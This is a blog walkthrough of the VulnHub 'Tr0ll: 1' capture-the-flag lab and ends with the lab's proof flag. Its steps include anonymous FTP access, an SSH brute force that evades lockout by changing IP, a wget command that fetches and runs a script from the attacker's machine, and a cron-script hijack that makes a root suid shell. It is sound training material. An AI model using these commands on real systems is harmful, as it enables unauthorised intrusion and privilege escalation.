---
layout: blog_item
title: "Tr0ll 1 Walkthrough"
date: "2014-12-26 02:12:52 +0200"
author: Arr0way
categories: [walkthroughs]
description: "Tr0ll: 1 walkthrough - step by step write up for Tr0ll: 1 a VulnHub Boot2Root challenge."
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}


I thought I'd have a go at a Boot2Root over Christmas, looking through the VM's I came accross [Tr0ll: 1](https://www.vulnhub.com/entry/tr0ll-1,100/) the discription caught my attention: 


<p>
<i>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</i>

<i>The goal is simple, gain root and get Proof.txt from the /root directory.</i>

<i>Not for the easily frustrated! Fair warning, there be trolls ahead!</i>

<i>Difficulty: Beginner ; Type: boot2root</i>
</p>

I downloaded the VM, span it up in VMWare and got cracking. 

##Enumeration 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">nmap -p 1-65535 -sV -sS -A -T4 192.168.78.140</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">nmap -p 1-65535 -sV -sS -A -T4 192.168.78.140</span>
        </p>
          <span class="output"><br></span>
          <span class="output">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-24 18:26 GMT<br></span>
          <span class="output">Nmap scan report for 192.168.78.140<br></span>
          <span class="output">Host is up (0.00035s latency).<br></span>
          <span class="output">Not shown: 65532 closed ports<br></span>
          <span class="output">PORT   STATE SERVICE VERSION <br></span> 
          <span class="output">21/tcp open  ftp     vsftpd 3.0.2<br></span>
          <span class="output">| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br></span>
          <span class="output">|_-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap [NSE: writeable]<br></span>
          <span class="output">22/tcp open  ssh     (protocol 2.0)<br></span>
          <span class="output">| ssh-hostkey: <br></span>
          <span class="output">|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)<br></span>
          <span class="output">|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)<br></span>
          <span class="output">|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)<br></span>
          <span class="output">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br></span>
          <span class="output">| http-robots.txt: 1 disallowed entry <br></span>
          <span class="output">|_/secret<br></span>
          <span class="output">|_http-title: Site doesn't have a title (text/html).<br></span>
          <span class="output">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :<br></span>
          <span class="output">SF-Port22-TCP:V=6.47%I=7%D=12/24%Time=549B054B%P=x86_64-unknown-linux-gnu%<br></span>
          <span class="output">SF:r(NULL,29,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");<br></span>
          <span class="output">MAC Address: 00:0C:29:D9:C1:FE (VMware)<br></span>
          <span class="output">Device type: general purpose<br></span>
          <span class="output">Running: Linux 3.X<br></span>
          <span class="output">OS CPE: cpe:/o:linux:linux_kernel:3<br></span>
          <span class="output">OS details: Linux 3.11 - 3.14<br></span>
          <span class="output">Network Distance: 1 hop<br></span>
          <span class="output">Service Info: OS: Unix<br></span>
          <span class="output"><br></span>
          <span class="output">TRACEROUTE<br></span>
          <span class="output">HOP RTT     ADDRESS<br></span>
          <span class="output">1   0.35 ms 192.168.78.140<br></span>
          <span class="output"><br></span>
          <span class="output">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .<br></span>
          <span class="output">Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds<br></span>
        </p>
      </div>
    </div>
</section>

###Service Enumeration 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 21</code></p></pc>
           </td>
           <td>
               <pc><p>FTP</p></pc>
           </td>
           <td>
               <pc><p>vsftpd 3.0.2</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
              <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>protocol 2.0</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.4.7 ((Ubuntu))</p></pc>
           </td>
        </tr>
      </tbody>
</table>
</div> 

###FTP Enumeration

Nmap discovered anonymous FTP was exposed on the target, I downloaded lol.pcap from ftp root: 


<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">ftp lol.pcap from target</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">ftp 192.168.78.140</span></p>
          <span class="output"><br></span>
          <span class="output">Connected to 192.168.78.140<br></span>
          <span class="output">220 (vsFTPd 3.0.2)<br></span>
          <span class="output">Name (192.168.78.140:root): anonymous<br></span>
          <span class="output">331 Please specify the password.<br></span>
          <span class="output">Password:<br></span> 
          <span class="output">230 Login successful.<br></span>
          <span class="output">Remote system type is UNIX.<br></span>
          <span class="output">Using binary mode to transfer files.<br></span>
          <span class="output">ftp> get lol.pcap<br></span>
          <span class="output">local: lol.pcap remote: lol.pcap<br></span>
          <span class="output">200 PORT command successful. Consider using PASV.<br></span>
          <span class="output">150 Opening BINARY mode data connection for lol.pcap (8068 bytes).<br></span>
          <span class="output">226 Transfer complete.<br></span>
          <span class="output">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br></span>
          <span class="output">8068 bytes received in 0.00 secs (1614.9 kB/s)<br></span>
          <span class="output">ftp> exit<br></span>
          <span class="output">221 Goodbye.<br></span>
        </p>
      </div>
    </div>
</section>

Examined the contents of lol.pcap in Wireshark, discovering the following message:

![tr0ll lol.pcap](/img/blog/tr0ll-lol.pcap.png) 

For clarity the message read: 

<i>FTP Data (Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P Sucks, you were so close... gotta TRY HARDER!</i> 


Checking for exposed serives in the previous Nmap scan we can see FTP, SSH and HTTP are exposed. 

A quick attempt at logging in over SSH with root with the password "sup3rs3cr3tdirlol"  - resulted in a fail (as expected). 

Onto the next service in the list. 

###HTTP Enumeration

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">nmap --script=http-enum -p80 -n 192.168.78.140</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">nmap --script=http-enum -p80 -n 192.168.78.140</span></p>
          <span class="output"><br></span>
          <span class="output">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-24 18:40 GMT<br></span>
          <span class="output">Nmap scan report for 192.168.78.140<br></span>
          <span class="output">Host is up (0.00046s latency).<br></span>
          <span class="output">PORT   STATE SERVICE<br></span>
          <span class="output">80/tcp open  http<br></span> 
          <span class="output">| http-enum:<br></span>
          <span class="output">|   /robots.txt: Robots file<br></span>
          <span class="output">|_  /secret/: Potentially interesting folder<br></span>
          <span class="output">MAC Address: 00:0C:29:D9:C1:FE (VMware)<br></span>
          <span class="output"><br></span>
          <span class="output">Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds<br></span>
        </p>
      </div>
    </div>
</section>

Entering /secret/ url in the browser rendered: 

![tr0ll U MAD BRO](/img/blog/u-mad-bro-tr0ll.png)

Nothing exciting was in the page source... 

I took a guess and entered sup3rs3cr3tdirlol as a dir: 

![tr0ll sup3rs3cr3tdirlol](/img/blog/sup3rs3cr3tdirlol.png)

Lucked in! But it didn't contain this:  

![tr0ll Pass.txt](/img/kirk-rofl.gif)


strings output for "roflmao": 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">strings ~/Downloads/roflmao</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">strings ~/Downloads/roflmao</span></p>
          <span class="output"><br></span>
          <span class="output">lib/ld-linux.so.2<br></span>
          <span class="output">libc.so.6<br></span>
          <span class="output">_IO_stdin_used<br></span>
          <span class="output">printf<br></span>
          <span class="output">__libc_start_main<br></span> 
          <span class="output">__gmon_start__<br></span>
          <span class="output">GLIBC_2.0<br></span>
          <span class="output">PTRh<br></span>
          <span class="output">[^_]<br></span>
          <span class="output">Find address 0x0856BF to proceed<br></span>
          <span class="output">;*2$"<br></span>
        </p>
      </div>
    </div>
</section>

The binary appeared to just print "0x0856BF", I entered this in the browser again - not expecting it to work.

![tr0ll which on lol](/img/blog/which_one_lol.txt.png) 

I lucked in again!

Another dir contained: 

![tr0ll Pass.txt](/img/blog/pass.txt.png) 

Containing: 

{% highlight bash %}
Good_job_:)
{% endhighlight %}

##SSH Brute Force

I manually attempted a SSH brute force using the previously discovered usernames + password from Pass.txt. After several attempts the connection was refused via SSH, rebooting the target VM did not help - I suspected iptables, fail2ban / DenyHosts. 

Changing the attacking machines IP address allowed me to reconnect, none of the usernames authenticated with the password in Pass.txt. 

![Picard Puff](/img/picard-puff.gif)

Not sure what to do next, I tried the file name as the password against the previous list (annoyingly I had to change the target machines IP address again to complete). 

### Remote Exploit

Success, I managed to authenticate as:

<div class="mobile-side-scroller" style="width:50%;">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>overflow</code></p></pc>
           </td>
           <td>
               <pc><p>Pass.txt</p></pc>
           </td>
        </tr>
      </tbody>
</table>
</div> 


<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">ssh overflow@192.168.78.140</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">ssh overflow@192.168.78.140</span></p>
          <span class="output"><br></span>
          <span class="output">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)<br></span>
          <span class="output"><br></span>
		  <span class="output">* Documentation:  https://help.ubuntu.com/<br></span>
		  <span class="output"><br></span>
          <span class="output">The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.<br></span>
		  <span class="output"><br></span>
          <span class="output">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.<br></span>
		  <span class="output"><br></span>
          <span class="output">The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.<br></span>
          <span class="output">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.<br></span>
          <span class="output"><br></span>
          <span class="output">Last login: Wed Dec 24 12:00:52 2014 from 192.168.78.128<br></span>
		  <span class="output">Could not chdir to home directory /home/overflow: No such file or directory<br></span>
		  <span class="output"><br></span>
		  <span class="output">$ id<br></span>
	      <span class="output">uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)<br></span>

        </p>
      </div>
    </div>
</section>

Then almost as soon as I'd logged in, the following message printed to console and the session closed: 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Broadcast Message from root@trol</p>
      <div class="shell">
        <p class="line">
		  <span class="output"><br></span>
          <span class="output">Broadcast Message from root@trol<br></span>
          <span class="output">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(somewhere) at 22:00 ... <br></span>
		  <span class="output"><br></span>
		</p>
		<p class="line">
		  <span class="output">TIMES UP LOL!<br></span>
        </p>
      </div>
    </div>
</section>

This became rather annoying... 

![Janeway Annoyed](/img/janeway-annoyed.gif)

## Local Enumeration 

I copied over my local enumeration sctipt to /var/tmp/ which discovered the following world writable files:

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Local Enumeration Sctipt</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">wget http://attacking-machine/exploits/enumeration/lin/linux-local-enum.sh -P /var/tmp/ && chmod 700 /var/tmp/linux-local-enum.sh && ./var/tmp/linux-local-enum.sh<br></span>
        </p>
      </div>
    </div>
</section>

### Weak Filesystem Permissions

The enumeration script identified the following world writable files: 

{% highlight bash %}
#########################################
## 777 Files                           ##
#########################################

/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/lib/log/cleaner.py
{% endhighlight %}

### Enumeration Findings

/lib/log/cleaner.py was owned by root and executed by cron to clean out /tmp 

## Local Privilege Escalation

From the attacking machine I downloaded an suid bin (spawns a shell) to /usr/bin/suid on the target.

Exploiting the poor filesystem permissions, I swapped out the contents of /lib/log/cleaner.py for: 

{% highlight python %}
#!/usr/bin/env python
import os
import sys
try:
    os.system('chown root:root /var/tmp/suid; chmod 4777 /var/tmp/suid')
except:
    sys.exit()
{% endhighlight %}

### Got Root

Went to get a coffee, came back and reconnected after the annoying message. 

Executed my suid binary, got root. 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Local Privilege Escalation</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">/var/tmp/suid<br></span>
        </p>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">cat /root/proof.txt<br></span>
          <br>
          <span class="output">Good job, you did it!<br></span>
          <br>
          <span class="output">702a8c18d29c6f3ca0d99ef5712bfbdc<br></span>
        </p>
        <br>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">id<br></span>
          <br>
          <span class="output">uid=0(root) gid=0(root) groups=0(root),1002(overflow)<br></span>
        </p>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>     
          <span class="command">whoami<br></span>
          <br>
          <span class="output">root<br></span>
        </p>
      </div>
    </div>
</section>

####Root dance...

![Picard Dancing](/img/picard-shake-it-so.gif)

##Thanks 

Thanks to [@maleus21](https://twitter.com/@maleus21) for creating this VM challenege. 